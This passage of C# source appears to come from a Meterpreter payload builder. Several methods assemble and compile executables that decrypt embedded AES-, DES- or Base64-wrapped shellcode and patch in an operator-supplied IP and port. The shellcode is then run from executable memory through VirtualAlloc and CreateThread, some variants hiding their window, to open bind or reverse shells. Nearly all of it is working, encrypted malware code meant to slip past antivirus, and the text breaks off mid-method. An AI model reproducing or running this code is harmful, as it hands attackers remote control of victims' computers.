                         "string shellCodeRaw = \"/OiCAAAAYInlMcBki1Awi1IMi1IUi3IoD7dKJjH/rDxhfAIsIMHPDQHH4vJSV4tSEItKPItMEXjjSAHRUYtZIAHTi0kY4zpJizSLAdYx/6zBzw0BxzjgdfYDffg7fSR15FiLWCQB02aLDEuLWBwB04sEiwHQiUQkJFtbYVlaUf/gX19aixLrjV1oMzIAAGh3czJfVGhMdyYH/9W4kAEAACnEVFBoKYBrAP/VagtZUOL9agFqAmjqD9/g/9WXaAIAEVyJ5moQVldowts3Z//VhcB1WFdot+k4///VV2h07Dvh/9VXl2h1bk1h/9VqAGoEVldoAtnIX//Vg/gAfi2LNmpAaAAQAABWagBoWKRT5f/Vk1NqAFZTV2gC2chf/9WD+AB+BwHDKcZ16cM=\";" +

                         "string s3 = Convert.ToBase64String(shellCodePacket);" +
                         "string newShellCode = shellCodeRaw.Replace(\"aAIAEVyJ\", s3);" +
                         "byte[] shellCodeBase64 = Convert.FromBase64String(newShellCode);" +
                         "UInt32 funcAddr = VirtualAlloc(0, (UInt32)shellCodeBase64.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);" +
                         "Marshal.Copy(shellCodeBase64, 0, (IntPtr)(funcAddr), shellCodeBase64.Length);" +
                         "IntPtr hThread = IntPtr.Zero;" +
                         "UInt32 threadId = 0;" +
                         "IntPtr pinfo = IntPtr.Zero;" +
                         "hThread = CreateThread(0, 0, funcAddr, pinfo, 0, ref threadId);" +
                         "WaitForSingleObject(hThread, 0xFFFFFFFF);" +
                         "return;" +
                         "}" +
                         "catch (Exception e)" +
                         "{" +
                         "Console.WriteLine(e);" +
                         "throw;" +
                         "}" +
                         "}" +

                         "private static UInt32 MEM_COMMIT = 0x1000;" +
                         "private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;" +
                         "[DllImport(\"kernel32\")]" +
                         "private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr, UInt32 size, UInt32 flAllocationType, UInt32 flProtect);" +
                         "[DllImport(\"kernel32\")]" +
                         "private static extern IntPtr CreateThread(UInt32 lpThreadAttributes, UInt32 dwStackSize, UInt32 lpStartAddress, IntPtr param, UInt32 dwCreationFlags, ref UInt32 lpThreadId);" +
                         "[DllImport(\"kernel32\")]" +
                         "private static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);" +
                         "}" +
                         "}";
            var compiler = new Compiler();
            compiler.Console(randomFileName, "_bind.exe", strMtr, "x86");
            ReturnMessageBox(randomFileName + "_bind.exe", compiler.isCreated);
        }
        public void SaveBindMeterpreter()
        {
            var randomFileName = RandomFileName(0, 5);
            var strMtr =
                "using System; using System.Runtime.InteropServices; using System.Threading.Tasks; using System.Windows.Forms; namespace MeterpreterForm { public partial class Form1 : Form { public Form1() { InitializeComponent(); } private void Form1_Load(object sender, EventArgs e) { this.Hide(); Task.Factory.StartNew(() => RunMeterpreter(\"" +
                Ip + "\", \"" + Port +
                "\")); } public static void RunMeterpreter(string ip, string port) { try { int inputPort = Int32.Parse(port); byte port1Byte = 0x00; byte port2Byte = 0x00; byte[] shellCodePacket = new byte[6]; if (inputPort > 256) { int portOct1 = inputPort / 256; int portOct2 = portOct1 * 256; int portOct3 = inputPort - portOct2; int portoct1Calc = portOct1 * 256 + portOct3; if (inputPort == portoct1Calc) { port1Byte = Convert.ToByte(portOct1); port2Byte = Convert.ToByte(portOct3); shellCodePacket[0] = 0x68; shellCodePacket[1] = 0x02; shellCodePacket[2] = 0x00; shellCodePacket[3] = port1Byte; shellCodePacket[4] = port2Byte; shellCodePacket[5] = 0x89; } } else { shellCodePacket[0] = 0x68; shellCodePacket[1] = 0x02; shellCodePacket[2] = 0x00; shellCodePacket[3] = port1Byte; shellCodePacket[4] = Convert.ToByte(inputPort); shellCodePacket[5] = 0x89; } string shellCodeRaw = \"/OiCAAAAYInlMcBki1Awi1IMi1IUi3IoD7dKJjH/rDxhfAIsIMHPDQHH4vJSV4tSEItKPItMEXjjSAHRUYtZIAHTi0kY4zpJizSLAdYx/6zBzw0BxzjgdfYDffg7fSR15FiLWCQB02aLDEuLWBwB04sEiwHQiUQkJFtbYVlaUf/gX19aixLrjV1oMzIAAGh3czJfVGhMdyYH/9W4kAEAACnEVFBoKYBrAP/VagtZUOL9agFqAmjqD9/g/9WXaAIAEVyJ5moQVldowts3Z//VhcB1WFdot+k4///VV2h07Dvh/9VXl2h1bk1h/9VqAGoEVldoAtnIX//Vg/gAfi2LNmpAaAAQAABWagBoWKRT5f/Vk1NqAFZTV2gC2chf/9WD+AB+BwHDKcZ16cM=\"; string s3 = Convert.ToBase64String(shellCodePacket); string newShellCode = shellCodeRaw.Replace(\"aAIAEVyJ\", s3); byte[] shellCodeBase64 = Convert.FromBase64String(newShellCode); UInt32 funcAddr = VirtualAlloc(0, (UInt32)shellCodeBase64.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE); Marshal.Copy(shellCodeBase64, 0, (IntPtr)(funcAddr), shellCodeBase64.Length); IntPtr hThread = IntPtr.Zero; UInt32 threadId = 0; IntPtr pinfo = IntPtr.Zero; hThread = CreateThread(0, 0, funcAddr, pinfo, 0, ref threadId); WaitForSingleObject(hThread, 0xFFFFFFFF); return; } catch (Exception e) { Console.WriteLine(e); throw; } } private static UInt32 MEM_COMMIT = 0x1000; private static UInt32 PAGE_EXECUTE_READWRITE = 0x40; [DllImport(\"kernel32\")] private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr, UInt32 size, UInt32 flAllocationType, UInt32 flProtect); [DllImport(\"kernel32\")] private static extern IntPtr CreateThread(UInt32 lpThreadAttributes, UInt32 dwStackSize, UInt32 lpStartAddress, IntPtr param, UInt32 dwCreationFlags, ref UInt32 lpThreadId); [DllImport(\"kernel32\")] private static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds); } } ";
            var compiler = new Compiler();
            compiler.Form(randomFileName, @"_bind.exe", strMtr, "x86");
            ReturnMessageBox(randomFileName + "_bind.exe", compiler.isCreated);
        }
        public void SaveReverseMeterpreterAesConsole()
        {
            var randomFileName = RandomFileName(0, 5);
            var encrypt = new Encrypter();
            var shellcode =
                "TbEpFmKQExTR+1+AIANyA4fkfHdCvBqaIJhc9XGr3m6n552T2SIaDfNjyAuRQtHZ4LUOnjPwJ56FYeUKPqu4sJcauTHMLvMbLrmhRBgXCVrdHD80yWEWXMhzRkuPqxM+CdEyaL9lJ20B9ejvHCBKsjX4ZKhRhuV2Oi274aFGCLQ5nX45KOtEbJWFiCxWiW4SIEAUaZk2cA7S/rdz72ZWonsfP0NesTrXQeiY43zOJo7v0n24yu6DWl0DwAGTlvFcubN8qZW5QzWfktKIK+ucnDmc5KLZ4kR2XhWhbVRMDnwsoVmKSdL/B9pr7RwGoIa76wWkFHPlAPth5/nkhUW49PEGLA4vZhOTRTPrGjhzjaaxoGTgze7FT+J1riGzUzLzD7mKgbZ4c9I9ZYdHpx8PvoaIUBYgr38J078/AkvZVERnwrt3iS2etlxmD0fHHY2nUjYpp9Kk+CH9snNS5sgiWmp48T4UX0cbf0tzd3KzK8F7y5Y7NtLvXevguCFA6XElfvPyVptkYSKlNbjus4YPkJRyypN2S5FyoMOzJhZ1wqQWHQMjBHChPaLQ8R/JuzYUbAwEMiZYgV7Rbk9PFT7uOg==";
            var MeterpreterBuilderCode =
                "using System; using System.IO; using System.Runtime.InteropServices; using System.Security.Cryptography; using System.Text; namespace MeterpreterBuilder { class Program { static void Main(string[] args) { RunMeterpreter(\"" +
                Ip + "\",\"" + Port +
                "\"); }  public static void RunMeterpreter(string ip, string port) { try { string shellCodeAes = \"" +
                shellcode.Replace(" ", "") +
                "\"; var ipOctetSplit = ip.Split('.'); byte octByte1 = Convert.ToByte(ipOctetSplit[0]); byte octByte2 = Convert.ToByte(ipOctetSplit[1]); byte octByte3 = Convert.ToByte(ipOctetSplit[2]); byte octByte4 = Convert.ToByte(ipOctetSplit[3]); int inputPort = Int32.Parse(port); byte port1Byte = 0x00; byte port2Byte = 0x00; if (inputPort > 256) { int portOct1 = inputPort / 256; int portOct2 = portOct1 * 256; int portOct3 = inputPort - portOct2; int portoct1Calc = portOct1 * 256 + portOct3; if (inputPort == portoct1Calc) { port1Byte = Convert.ToByte(portOct1); port2Byte = Convert.ToByte(portOct3); } } else { port1Byte = 0x00; port2Byte = Convert.ToByte(inputPort); } byte[] shellCodePacket = new byte[9]; shellCodePacket[0] = octByte1; shellCodePacket[1] = octByte2; shellCodePacket[2] = octByte3; shellCodePacket[3] = octByte4; shellCodePacket[4] = 0x68; shellCodePacket[5] = 0x02; shellCodePacket[6] = 0x00; shellCodePacket[7] = port1Byte; shellCodePacket[8] = port2Byte; var AesDecryptBase64 = Encrypter.DecryptAes(shellCodeAes, \"]Ze68t`WFDrs9DJ(cIXTqOvHJnjJR':%oA77go\"); string s3 = Convert.ToBase64String(shellCodePacket); string newShellCode = AesDecryptBase64.Replace(\"wKiLhmgCANkD\", s3); byte[] shellCodeBase64 = Convert.FromBase64String(newShellCode); UInt32 funcAddr = VirtualAlloc(0, (UInt32) shellCodeBase64.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE); Marshal.Copy(shellCodeBase64, 0, (IntPtr) (funcAddr), shellCodeBase64.Length); IntPtr hThread = IntPtr.Zero; UInt32 threadId = 0; IntPtr pinfo = IntPtr.Zero; hThread = CreateThread(0, 0, funcAddr, pinfo, 0, ref threadId); WaitForSingleObject(hThread, 0xFFFFFFFF); return; } catch (Exception e) { Console.WriteLine(e); throw; } } private static UInt32 MEM_COMMIT = 0x1000; private static UInt32 PAGE_EXECUTE_READWRITE = 0x40; [DllImport(\"kernel32\")] private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr, UInt32 size, UInt32 flAllocationType, UInt32 flProtect); [DllImport(\"kernel32\")] private static extern IntPtr CreateThread(UInt32 lpThreadAttributes, UInt32 dwStackSize, UInt32 lpStartAddress, IntPtr param, UInt32 dwCreationFlags, ref UInt32 lpThreadId); [DllImport(\"kernel32\")] private static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds); } " + encrypt.DecryptAesCsharpString() + " }";
            var compiler = new Compiler();
            compiler.Console(randomFileName, "_reverse_Aes.exe", MeterpreterBuilderCode, "x86");
            ReturnMessageBox(randomFileName + "_reverse_Aes.exe", compiler.isCreated);
        }
        public void SaveReverseMeterpreterAes()
        {
            var randomFileName = RandomFileName(0, 5);
            var encrypt = new Encrypter();
            var shellcode =
                "TbEpFmKQExTR+1+AIANyA4fkfHdCvBqaIJhc9XGr3m6n552T2SIaDfNjyAuRQtHZ4LUOnjPwJ56FYeUKPqu4sJcauTHMLvMbLrmhRBgXCVrdHD80yWEWXMhzRkuPqxM+CdEyaL9lJ20B9ejvHCBKsjX4ZKhRhuV2Oi274aFGCLQ5nX45KOtEbJWFiCxWiW4SIEAUaZk2cA7S/rdz72ZWonsfP0NesTrXQeiY43zOJo7v0n24yu6DWl0DwAGTlvFcubN8qZW5QzWfktKIK+ucnDmc5KLZ4kR2XhWhbVRMDnwsoVmKSdL/B9pr7RwGoIa76wWkFHPlAPth5/nkhUW49PEGLA4vZhOTRTPrGjhzjaaxoGTgze7FT+J1riGzUzLzD7mKgbZ4c9I9ZYdHpx8PvoaIUBYgr38J078/AkvZVERnwrt3iS2etlxmD0fHHY2nUjYpp9Kk+CH9snNS5sgiWmp48T4UX0cbf0tzd3KzK8F7y5Y7NtLvXevguCFA6XElfvPyVptkYSKlNbjus4YPkJRyypN2S5FyoMOzJhZ1wqQWHQMjBHChPaLQ8R/JuzYUbAwEMiZYgV7Rbk9PFT7uOg==";
            var strMtr =
                "using System; using System.IO; using System.Runtime.InteropServices; using System.Security.Cryptography; using System.Text; using System.Threading.Tasks; using System.Windows.Forms; namespace MeterpreterForm { public partial class Form1 : Form { public Form1() { InitializeComponent(); } private void Form1_Load(object sender, EventArgs e) { this.Hide(); Task.Factory.StartNew(() => RunMeterpreter(\"" +
                Ip + "\", \"" + Port +
                "\")); } public static void RunMeterpreter(string ip, string port) { try { string shellCodeAes = \"" +
                shellcode.Replace(" ", "") +
                "\"; var ipOctetSplit = ip.Split('.'); byte octByte1 = Convert.ToByte(ipOctetSplit[0]); byte octByte2 = Convert.ToByte(ipOctetSplit[1]); byte octByte3 = Convert.ToByte(ipOctetSplit[2]); byte octByte4 = Convert.ToByte(ipOctetSplit[3]); int inputPort = Int32.Parse(port); byte port1Byte = 0x00; byte port2Byte = 0x00; if (inputPort > 256) { int portOct1 = inputPort / 256; int portOct2 = portOct1 * 256; int portOct3 = inputPort - portOct2; int portoct1Calc = portOct1 * 256 + portOct3; if (inputPort == portoct1Calc) { port1Byte = Convert.ToByte(portOct1); port2Byte = Convert.ToByte(portOct3); } } else { port1Byte = 0x00; port2Byte = Convert.ToByte(inputPort); } byte[] shellCodePacket = new byte[9]; shellCodePacket[0] = octByte1; shellCodePacket[1] = octByte2; shellCodePacket[2] = octByte3; shellCodePacket[3] = octByte4; shellCodePacket[4] = 0x68; shellCodePacket[5] = 0x02; shellCodePacket[6] = 0x00; shellCodePacket[7] = port1Byte; shellCodePacket[8] = port2Byte; var AesDecryptBase64 = Encrypter.DecryptAes(shellCodeAes, \"]Ze68t`WFDrs9DJ(cIXTqOvHJnjJR':%oA77go\"); string s3 = Convert.ToBase64String(shellCodePacket); string newShellCode = AesDecryptBase64.Replace(\"wKiLhmgCANkD\", s3); byte[] shellCodeBase64 = Convert.FromBase64String(newShellCode); UInt32 funcAddr = VirtualAlloc(0, (UInt32)shellCodeBase64.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE); Marshal.Copy(shellCodeBase64, 0, (IntPtr)(funcAddr), shellCodeBase64.Length); IntPtr hThread = IntPtr.Zero; UInt32 threadId = 0; IntPtr pinfo = IntPtr.Zero; hThread = CreateThread(0, 0, funcAddr, pinfo, 0, ref threadId); WaitForSingleObject(hThread, 0xFFFFFFFF); return; } catch (Exception e) { Console.WriteLine(e); throw; } } private static UInt32 MEM_COMMIT = 0x1000; private static UInt32 PAGE_EXECUTE_READWRITE = 0x40; [DllImport(\"kernel32\")] private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr, UInt32 size, UInt32 flAllocationType, UInt32 flProtect); [DllImport(\"kernel32\")] private static extern IntPtr CreateThread(UInt32 lpThreadAttributes, UInt32 dwStackSize, UInt32 lpStartAddress, IntPtr param, UInt32 dwCreationFlags, ref UInt32 lpThreadId); [DllImport(\"kernel32\")] private static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds); } " + encrypt.DecryptAesCsharpString() + " } ";
            var compiler = new Compiler();
            compiler.Form(randomFileName, @"_reverse_Aes.exe", strMtr, "x86");
            ReturnMessageBox(randomFileName + "_reverse_Aes.exe", compiler.isCreated);
        }
        public void SaveMeterpreterRc4AesConsole()
        {
            var randomFileName = RandomFileName(0, 5);
            var encrypter = new Encrypter();
            var strMtr =
                "using System; using System.IO; using System.Runtime.InteropServices; using System.Security.Cryptography; using System.Text; namespace MeterpreterBuilder { class MeterpreterRc4 { static void Main(string[] args) { RunMeterpreter(\"" +
                Ip + "\", \"" + Port +
                "\"); var str = Convert.ToString(Console.ReadLine()); } public static void RunMeterpreter(string ip, string port) { try { var ipOctetSplit = ip.Split('.'); byte octByte1 = Convert.ToByte(ipOctetSplit[0]); byte octByte2 = Convert.ToByte(ipOctetSplit[1]); byte octByte3 = Convert.ToByte(ipOctetSplit[2]); byte octByte4 = Convert.ToByte(ipOctetSplit[3]); int inputPort = Int32.Parse(port); byte port1Byte = 0x00; byte port2Byte = 0x00; byte[] shellCodePacket = new byte[15]; shellCodePacket[0] = 0x6a; shellCodePacket[1] = 0x05; shellCodePacket[2] = 0x68; shellCodePacket[3] = octByte1; shellCodePacket[4] = octByte2; shellCodePacket[5] = octByte3; shellCodePacket[6] = octByte4; shellCodePacket[7] = 0x68; shellCodePacket[8] = 0x02; shellCodePacket[9] = 0x00; if (inputPort > 256) { int portOct1 = inputPort / 256; int portOct2 = portOct1 * 256; int portOct3 = inputPort - portOct2; int portoct1Calc = portOct1 * 256 + portOct3; if (inputPort == portoct1Calc) { port1Byte = Convert.ToByte(portOct1); port2Byte = Convert.ToByte(portOct3); shellCodePacket[10] = port1Byte; shellCodePacket[11] = port2Byte; } } else { shellCodePacket[10] = port1Byte; shellCodePacket[11] = Convert.ToByte(inputPort); } shellCodePacket[12] = 0x89; shellCodePacket[13] = 0xe6; shellCodePacket[14] = 0x50; string shellCodeRaw = \"dfZfugPh4aH9I59udS8TxndPJHyikImZZ7k+fmKBJcOiGcswSmkqUzHoWTqettO3ocgYxxbvPyh6LeERWshsG4lU0CYXDRnyiMgAJbuNrPTpjlfcTZGLmPNj51T94EOwsXN6n3DwG6LW11AiCj7aXIT13Akh1WM6pqIGF7o2ACpgWj2gXWsbA9zTTswKglAvOD/u6f/s3erzrnucz5Y1xMIlJOcGJAuqvJYpjc42B3z6wf94/wq0ICiCmnLUqEDJ6ti0Uqwoo1DOK/jm7ckEa7n5Q3b4Lw9CclINLobg+FtT66AEH4dpycF2mi6Hr/OEfY/B6ERXvLzFvFpm5vvzMq5Q9wWAw3cnUkIxSj6ASzV6CoLibXWTrroZmWZ9eHRbPk8ITxM1NS8ssgfvdHirT8pIe5TswRrMRghTkANRnzFoYnNMg1VbeHdpRYJsHsvruGlcWrKE0xKT+KWUjS7D72h81fFrpQMfKQnq0tOtTXitBWoegSQ9kdqyD99lbg3kw1rRMvtx427DaRqWTeyAg08uVda525f/ynjdqMDHf60cKzPqRZGcoeaQzfi6jqTz2satOVVhROlw8piGXb+zAwTEzLQzcoovV2jLlm8yOtkRsGPbYOED3yrs39SwHJ0p6/SpmzktLiFuIufQkpMYBnLVJb0ipOLy2IY8gLT5DDfNxGnpf8llOcYAtbh9CmuXjqly888uvOTs8p0albNa2As9RvfwxiJZWqs8gwikwt5G+dA9GcxrzG6ocxkFhkjKIWQrmsQ7acRaiJV1mZH6qA==\"; string s3 = Convert.ToBase64String(shellCodePacket); var decryptShellCode = Encrypter.DecryptAes(shellCodeRaw, \"k}{eG>ES,i6mTCAsG)1udbki/a\"); string newShellCode = decryptShellCode.Replace(\"agVowKiLhmgCABFcieZQ\", s3); byte[] shellCodeBase64 = Convert.FromBase64String(newShellCode); UInt32 funcAddr = VirtualAlloc(0, (UInt32)shellCodeBase64.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE); Marshal.Copy(shellCodeBase64, 0, (IntPtr)(funcAddr), shellCodeBase64.Length); IntPtr hThread = IntPtr.Zero; UInt32 threadId = 0; IntPtr pinfo = IntPtr.Zero; hThread = CreateThread(0, 0, funcAddr, pinfo, 0, ref threadId); WaitForSingleObject(hThread, 0xFFFFFFFF); return; } catch (Exception e) { Console.WriteLine(e); throw; } } private static UInt32 MEM_COMMIT = 0x1000; private static UInt32 PAGE_EXECUTE_READWRITE = 0x40; [DllImport(\"kernel32\")] private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr, UInt32 size, UInt32 flAllocationType, UInt32 flProtect); [DllImport(\"kernel32\")] private static extern IntPtr CreateThread(UInt32 lpThreadAttributes, UInt32 dwStackSize, UInt32 lpStartAddress, IntPtr param, UInt32 dwCreationFlags, ref UInt32 lpThreadId); [DllImport(\"kernel32\")] private static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds); " + encrypter.DecryptAesCsharpString() + " } }";
            var compiler = new Compiler();
            compiler.Console(randomFileName, "_rc4_aes.exe", strMtr, "x86");
            ReturnMessageBox(randomFileName + "_rc4_aes.exe", compiler.isCreated);
        }
        public void SaveMeterpreterRc4Aes()
        {
            var randomFileName = RandomFileName(0, 5);
            var encrypter = new Encrypter();
            var strMtr =
                "using System; using System.IO; using System.Runtime.InteropServices; using System.Security.Cryptography; using System.Text; using System.Threading.Tasks; using System.Windows.Forms; namespace MeterpreterForm { public partial class Form1 : Form { public Form1() { InitializeComponent(); } private void Form1_Load(object sender, EventArgs e) { this.Hide(); Task.Factory.StartNew(() => RunMeterpreter(\"" +
                Ip + "\", \"" + Port +
                "\")); } public static void RunMeterpreter(string ip, string port) { try { var ipOctetSplit = ip.Split('.'); byte octByte1 = Convert.ToByte(ipOctetSplit[0]); byte octByte2 = Convert.ToByte(ipOctetSplit[1]); byte octByte3 = Convert.ToByte(ipOctetSplit[2]); byte octByte4 = Convert.ToByte(ipOctetSplit[3]); int inputPort = Int32.Parse(port); byte port1Byte = 0x00; byte port2Byte = 0x00; byte[] shellCodePacket = new byte[15]; shellCodePacket[0] = 0x6a; shellCodePacket[1] = 0x05; shellCodePacket[2] = 0x68; shellCodePacket[3] = octByte1; shellCodePacket[4] = octByte2; shellCodePacket[5] = octByte3; shellCodePacket[6] = octByte4; shellCodePacket[7] = 0x68; shellCodePacket[8] = 0x02; shellCodePacket[9] = 0x00; if (inputPort > 256) { int portOct1 = inputPort / 256; int portOct2 = portOct1 * 256; int portOct3 = inputPort - portOct2; int portoct1Calc = portOct1 * 256 + portOct3; if (inputPort == portoct1Calc) { port1Byte = Convert.ToByte(portOct1); port2Byte = Convert.ToByte(portOct3); shellCodePacket[10] = port1Byte; shellCodePacket[11] = port2Byte; } } else { shellCodePacket[10] = port1Byte; shellCodePacket[11] = Convert.ToByte(inputPort); } shellCodePacket[12] = 0x89; shellCodePacket[13] = 0xe6; shellCodePacket[14] = 0x50; string shellCodeRaw = \"dfZfugPh4aH9I59udS8TxndPJHyikImZZ7k+fmKBJcOiGcswSmkqUzHoWTqettO3ocgYxxbvPyh6LeERWshsG4lU0CYXDRnyiMgAJbuNrPTpjlfcTZGLmPNj51T94EOwsXN6n3DwG6LW11AiCj7aXIT13Akh1WM6pqIGF7o2ACpgWj2gXWsbA9zTTswKglAvOD/u6f/s3erzrnucz5Y1xMIlJOcGJAuqvJYpjc42B3z6wf94/wq0ICiCmnLUqEDJ6ti0Uqwoo1DOK/jm7ckEa7n5Q3b4Lw9CclINLobg+FtT66AEH4dpycF2mi6Hr/OEfY/B6ERXvLzFvFpm5vvzMq5Q9wWAw3cnUkIxSj6ASzV6CoLibXWTrroZmWZ9eHRbPk8ITxM1NS8ssgfvdHirT8pIe5TswRrMRghTkANRnzFoYnNMg1VbeHdpRYJsHsvruGlcWrKE0xKT+KWUjS7D72h81fFrpQMfKQnq0tOtTXitBWoegSQ9kdqyD99lbg3kw1rRMvtx427DaRqWTeyAg08uVda525f/ynjdqMDHf60cKzPqRZGcoeaQzfi6jqTz2satOVVhROlw8piGXb+zAwTEzLQzcoovV2jLlm8yOtkRsGPbYOED3yrs39SwHJ0p6/SpmzktLiFuIufQkpMYBnLVJb0ipOLy2IY8gLT5DDfNxGnpf8llOcYAtbh9CmuXjqly888uvOTs8p0albNa2As9RvfwxiJZWqs8gwikwt5G+dA9GcxrzG6ocxkFhkjKIWQrmsQ7acRaiJV1mZH6qA==\"; string s3 = Convert.ToBase64String(shellCodePacket); var decryptShellCode = Encrypter.DecryptAes(shellCodeRaw, \"k}{eG>ES,i6mTCAsG)1udbki/a\"); string newShellCode = decryptShellCode.Replace(\"agVowKiLhmgCABFcieZQ\", s3); byte[] shellCodeBase64 = Convert.FromBase64String(newShellCode); UInt32 funcAddr = VirtualAlloc(0, (UInt32)shellCodeBase64.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE); Marshal.Copy(shellCodeBase64, 0, (IntPtr)(funcAddr), shellCodeBase64.Length); IntPtr hThread = IntPtr.Zero; UInt32 threadId = 0; IntPtr pinfo = IntPtr.Zero; hThread = CreateThread(0, 0, funcAddr, pinfo, 0, ref threadId); WaitForSingleObject(hThread, 0xFFFFFFFF); return; } catch (Exception e) { Console.WriteLine(e); throw; } } private static UInt32 MEM_COMMIT = 0x1000; private static UInt32 PAGE_EXECUTE_READWRITE = 0x40; [DllImport(\"kernel32\")] private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr, UInt32 size, UInt32 flAllocationType, UInt32 flProtect); [DllImport(\"kernel32\")] private static extern IntPtr CreateThread(UInt32 lpThreadAttributes, UInt32 dwStackSize, UInt32 lpStartAddress, IntPtr param, UInt32 dwCreationFlags, ref UInt32 lpThreadId); [DllImport(\"kernel32\")] private static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds); " + encrypter.DecryptAesCsharpString() + " } } ";
            var compiler = new Compiler();
            compiler.Form(randomFileName, @"_rc4_aes.exe", strMtr, "x86");
            ReturnMessageBox(randomFileName + "_rc4_aes.exe", compiler.isCreated);
        }
        public void SaveReverseMeterpreterDesConsole()
        {
            var randomFileName = RandomFileName(0, 5);
            var encrypter = new Encrypter();
            var strMtr =
                "using System; using System.IO; using System.Runtime.InteropServices; using System.Security.Cryptography; using System.Text; namespace MeterpreterBuilder { class Program { static void Main(string[] args) { RunMeterpreter(\"" +
                Ip + "\", \"" + Port +
                "\"); } public static void RunMeterpreter(string ip, string port) { try { string shellCodeRaw = \"R9Q8E3KBRaRMzmfSjoZFKtstugi2F6a+gU+x2Yv/uQNrZHHuv+GgiZTzOLTdPmH/nRaBOm7zDTi8Qg6fr0T81ZeytR76/AXUZCYYEtAuY+3MKuTVd/2nYqjljO5sWZF3yMxI9B3qpFemT7bM80AeKFw2nYBQDRtK5MsrphQPlNprLQvjIB4iVBYnrMZRphU8MvmQKxlvA0T+rv3Rpula2czM2xuqsj53sZNXGE8DvZzfA/hkesX9fdhECrCmbLcSdyadvaEapBMQpsDYZEoMItOTsRZKqPt9kds7CJ8SKWe9kfGrjxwYkQxyFUm6G9MAQIDctLiQA9LTg7wysch7z0I5DCvAwuHg9FqfqwUQIpnwCTExTMdz03PiLvICBog4oyjamw6Ki8/GvIa2mNPa4dmrvarAyAT8OaOQcrPyks90e75FOdDtfaul1LInMCGv2tAjkk3CCtP5dK6yAbTvbvQQ8BSSbPd87iUqU9TDP4rIJ+UJJ2QKuzrhuPoVoP2lhBRvdAR5V0yT/u9E51xe7tEs/a2V87htx9T0xnRXZigj44VB2Ph1otKhfCOkAjP3i9gRnqjMjYg=\"; var ipOctetSplit = ip.Split('.'); byte octByte1 = Convert.ToByte(ipOctetSplit[0]); byte octByte2 = Convert.ToByte(ipOctetSplit[1]); byte octByte3 = Convert.ToByte(ipOctetSplit[2]); byte octByte4 = Convert.ToByte(ipOctetSplit[3]); int inputPort = Int32.Parse(port); byte port1Byte = 0x00; byte port2Byte = 0x00; if (inputPort > 256) { int portOct1 = inputPort / 256; int portOct2 = portOct1 * 256; int portOct3 = inputPort - portOct2; int portoct1Calc = portOct1 * 256 + portOct3; if (inputPort == portoct1Calc) { port1Byte = Convert.ToByte(portOct1); port2Byte = Convert.ToByte(portOct3); } } else { port1Byte = 0x00; port2Byte = Convert.ToByte(inputPort); } byte[] shellCodePacket = new byte[9]; shellCodePacket[0] = octByte1; shellCodePacket[1] = octByte2; shellCodePacket[2] = octByte3; shellCodePacket[3] = octByte4; shellCodePacket[4] = 0x68; shellCodePacket[5] = 0x02; shellCodePacket[6] = 0x00; shellCodePacket[7] = port1Byte; shellCodePacket[8] = port2Byte; string s3 = Convert.ToBase64String(shellCodePacket); Encrypter enc = new Encrypter(); string shellCodeDecrypt = enc.DecryptDes(shellCodeRaw, \"<7/m9@bA\"); string newShellCode = shellCodeDecrypt.Replace(\"wKiLhmgCANkD\", s3); byte[] shellCodeBase64 = Convert.FromBase64String(newShellCode); UInt32 funcAddr = VirtualAlloc(0, (UInt32) shellCodeBase64.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE); Marshal.Copy(shellCodeBase64, 0, (IntPtr) (funcAddr), shellCodeBase64.Length); IntPtr hThread = IntPtr.Zero; UInt32 threadId = 0; IntPtr pinfo = IntPtr.Zero; hThread = CreateThread(0, 0, funcAddr, pinfo, 0, ref threadId); WaitForSingleObject(hThread, 0xFFFFFFFF); return; } catch (Exception e) { Console.WriteLine(e); throw; } } private static UInt32 MEM_COMMIT = 0x1000; private static UInt32 PAGE_EXECUTE_READWRITE = 0x40; [DllImport(\"kernel32\")] private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr, UInt32 size, UInt32 flAllocationType,UInt32 flProtect); [DllImport(\"kernel32\")] private static extern IntPtr CreateThread(UInt32 lpThreadAttributes, UInt32 dwStackSize, UInt32 lpStartAddress,IntPtr param, UInt32 dwCreationFlags, ref UInt32 lpThreadId); [DllImport(\"kernel32\")] private static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds); } " + encrypter.DecryptDesCsharpString() + " }";
            var compiler = new Compiler();
            compiler.Console(randomFileName, "_reverse_des.exe", strMtr, "x86");
            ReturnMessageBox(randomFileName + "_reverse_des.exe", compiler.isCreated);
        }
        public void SaveReverseMeterpreterDes()
        {
            var randomFileName = RandomFileName(0, 5);
            var encrypter = new Encrypter();
            var strMtr =
                "using System; using System.IO; using System.Runtime.InteropServices; using System.Security.Cryptography; using System.Text; using System.Threading.Tasks; using System.Windows.Forms; namespace MeterpreterForm { public partial class Form1 : Form { public Form1() { InitializeComponent(); } private void Form1_Load(object sender, EventArgs e) { this.Hide(); Task.Factory.StartNew(() => RunMeterpreter(\"" +
                Ip + "\", \"" + Port +
